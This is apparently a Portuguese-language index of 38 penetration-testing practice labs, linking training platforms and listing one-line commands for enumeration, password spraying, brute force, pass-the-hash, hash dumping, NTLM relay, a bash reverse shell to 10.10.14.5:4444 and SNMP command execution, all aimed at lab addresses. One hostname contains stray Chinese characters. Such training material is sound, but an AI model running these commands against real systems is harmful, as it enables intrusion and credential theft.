# 🧪 Labs de Exploração

> Labs organizados por arquivo de conteúdo. Cada lab aponta para o arquivo que ensina a teoria e os comandos.

---

## 📋 Pré-requisitos

| Pré-requisito | Nível | Observação |
|---------------|:-----:|------------|
| Kali Linux | ⭐⭐ | Com todas as ferramentas instaladas |
| Módulos 00-02 | ⭐⭐⭐ | Linux, redes, reconhecimento e web concluídos |
| SecLists | ⭐⭐ | `sudo apt install -y seclists` |
| Docker | ⭐⭐ | Para labs com máquinas vulneráveis |

---

## Labs por Arquivo

### 📦 Arquivo 01 — Preparação e Wordlists

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 1 | SecLists | TryHackMe | Navegação no SecLists, seleção para diferentes tarefas | [Link](https://tryhackme.com/room/seclists) | 30min |
| 2 | Crunch e CeWL | Local | Gerar wordlists com Crunch (padrão) e CeWL (sites) | `crunch 6 6 0123456789 -o num.txt` | 20min |
| 3 | Default Credentials | HackTheBox | Usar wordlists de credenciais padrão | [Link](https://app.hackthebox.com/starting-point) | 45min |

---

### 🔍 Arquivo 02 — Reconhecimento de Usuários e Escopo

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 4 | Enumeração SMB | Local | enum4linux-ng, smbclient, rpcclient | `enum4linux-ng -A 192.168.1.10` | 30min |
| 5 | Kerberos Enum | Local | kerbrute user enum | `kerbrute userenum --dc 192.168.1.10 -d empresa.local users.txt` | 20min |
| 6 | Pass-Policy | Local | Verificar lockout policy com NetExec | `nxc smb 192.168.1.10 -u '' -p '' --pass-pol` | 10min |

---

### 🔑 Arquivo 03 — Brute Force e Password Spraying

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 7 | Brute It | TryHackMe | Hydra SSH, cracking com John/Hashcat | [Link](https://tryhackme.com/room/bruteit) | 45min |
| 8 | Hydra | TryHackMe | Brute force SSH, FTP e HTTP forms | [Link](https://tryhackme.com/room/hydra) | 45min |
| 9 | Hashing Fun | TryHackMe | Hashing, cracking com John e Hashcat | [Link](https://tryhackme.com/room/hashingfun) | 30min |
| 10 | Password Spraying | Local | Spray em sub-rede com NetExec | `nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2025!' --continue-on-success` | 20min |
| 11 | Bandit Natas | OverTheWire | Brute force HTTP em cenário web | [Link](https://overthewire.org/wargames/natas/) | 30min |

---

### 🔄 Arquivo 04 — Credential Stuffing e Reuso

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 12 | Credential Reuse | Local | Testar mesma senha em múltiplos serviços | `hydra -l admin -P passwords.txt ssh://192.168.1.1` + `ftp://192.168.1.1` | 20min |
| 13 | Admin Panels | Local | Buscar painéis admin e testar credenciais padrão | `ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt` | 20min |

---

### 🖥️ Arquivo 05 — Exploração de Serviços de Rede

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 14 | Kenobi | TryHackMe | Samba exploit, privesc, path manipulation | [Link](https://tryhackme.com/room/kenobi) | 60min |
| 15 | Ice | TryHackMe | MS17-010 (EternalBlue), Metasploit, Meterpreter | [Link](https://tryhackme.com/room/ice) | 60min |
| 16 | Blue | TryHackMe | EternalBlue completo (ref. arquivo 05) | [Link](https://tryhackme.com/room/blue) | 60min |
| 17 | Mr Robot | TryHackMe | Brute force, exploitation, privilege escalation | [Link](https://tryhackme.com/room/mrrobot) | 90min |

---

### 🔗 Arquivo 06 — Pass-the-Hash e Impacket

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 18 | PtH com NetExec | Local | Pass-the-hash com secrets dump | `nxc smb 192.168.1.10 -u admin -H 'aad3b435...' --local-auth` | 20min |
| 19 | Impacket PsExec | Local | Shell via SMB com credenciais | `psexec.py empresa/admin:senha@192.168.1.10` | 15min |
| 20 | SecretsDump | Local | Dump de hashes SAM/LSA | `secretsdump.py empresa/admin:senha@192.168.1.10` | 15min |

---

### 📡 Arquivo 07 — NTLM Relay e Responder

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 21 | Responder + ntlmrelayx | Local | LLMNR poisoning + relay SMB/LDAP | Iniciar Responder, depois ntlmrelayx | 40min |
| 22 | IPv6 Poisoning | Local | mitm6 + NTLM relay via IPv6 | `mitm6 -d empresa.local --ignore-networks 192.168.1.0/24` | 30min |
| 23 | ADCS Abuse | Local | Relay para Certificate Authority | `ntlmrelayx.py -t http://ca01的企业.local/certsrv/certfnsh.asp -smb2support --adcs` | 30min |

---

### 🔧 Arquivo 08 — Metasploit Avançado e msfvenom

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 24 | Metasploit Intro | TryHackMe | msfconsole, search, use, exploit, sessions | [Link](https://tryhackme.com/room/metasploitintro) | 45min |
| 25 | Metasploit Exploitation | TryHackMe | msfvenom, handlers, sessions | [Link](https://tryhackme.com/room/metasploitexploitation) | 60min |
| 26 | Auxiliary Scanners | Local | Scan de rede com auxiliary/scanner/portscan/tcp | `msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run"` | 20min |
| 27 | Resource Scripts | Local | Automatizar sequências com arquivo .rc | Criar `scan.rc` com comandos msfconsole | 15min |

---

### 🐚 Arquivo 09 — Exploração Manual e Payloads

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 28 | Reverse Shells | Local | Testar reverse shells em 6 linguagens | `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1` | 20min |
| 29 | Shell Stabilization | Local | Estabilizar shell com Python PTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` | 15min |
| 30 | Socat shells | Local | Bind e reverse shell com socat | `socat TCP-LISTEN:4444,reuseaddr FILE:\`tty\`,raw,echo=0` | 20min |

---

### 💥 Arquivo 10 — Buffer Overflow Básico

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 31 | Narnia | OverTheWire | Binary exploitation, buffer overflow, format string | [SSH](narnia.labs.overthewire.org:2226) | 90min |
| 32 | Behemoth | OverTheWire | Binary exploitation avançado, ROP | [SSH](behemoth.labs.overthewire.org:2221) | 90min |
| 33 | PicoCTF Binary | PicoCTF | Buffer overflow, format string, heap | [Link](https://play.picoctf.org/practice) | 90min |
| 34 | Buffer Overflow Prep | TryHackMe | checksec, Ghidra, GDB, ROP chains | [Link](https://tryhackme.com/room/bufferoverflowprep) | 60min |
| 35 | Vulnserver TRUN | Local | Fuzzing → offset → bad chars → JMP ESP → shellcode | Immunity + mona.py (ref. arquivo 10) | 90min |

---

### 📊 Arquivo 11 — SNMP Enum e Exploitation

| # | Lab | Plataforma | O que praticar | Comando/Link | Tempo |
|---|-----|:----------:|:---------------|:-------------|:-----:|
| 36 | SNMP Enumeration | Local | onesixtyone, snmpwalk, snmp-check | `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.10` | 20min |
| 37 | SNMP Walk | Local | Enumerar OIDs com snmpwalk | `snmpwalk -v2c -c public 192.168.1.10` | 15min |
| 38 | SNMP Write | Local | Alterar configurações via snmpset | `snmpset -v2c -c private 192.168.1.10 NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd".0 i 1` | 15min |

---

## 📊 Resumo

| Arquivo | Labs | Foco |
|:--------|:----:|:-----|
| 01 Preparação | 3 | Wordlists (SecLists, Crunch, CeWL) |
| 02 Reconhecimento | 3 | Usuários, pass-pol, escopo |
| 03 Brute Force | 5 | Hydra, Medusa, John, Hashcat, NetExec |
| 04 Credential Stuffing | 2 | Reuso cross-service, admin panels |
| 05 Serviços de Rede | 4 | SMB, FTP, SSH, RDP (EternalBlue, BlueKeep) |
| 06 Pass-the-Hash | 3 | PtH, Impacket, secretsdump |
| 07 NTLM Relay | 3 | Responder, ntlmrelayx, mitm6 |
| 08 Metasploit | 4 | Auxiliary, msfvenom, handlers, .rc |
| 09 Shells Manuais | 3 | Reverse/bind shells, estabilização |
| 10 Buffer Overflow | 5 | Narnia, Behemoth, PicoCTF, Vulnserver |
| 11 SNMP | 3 | Enumeração, walk, escrita |
| **Total** | **38** | |
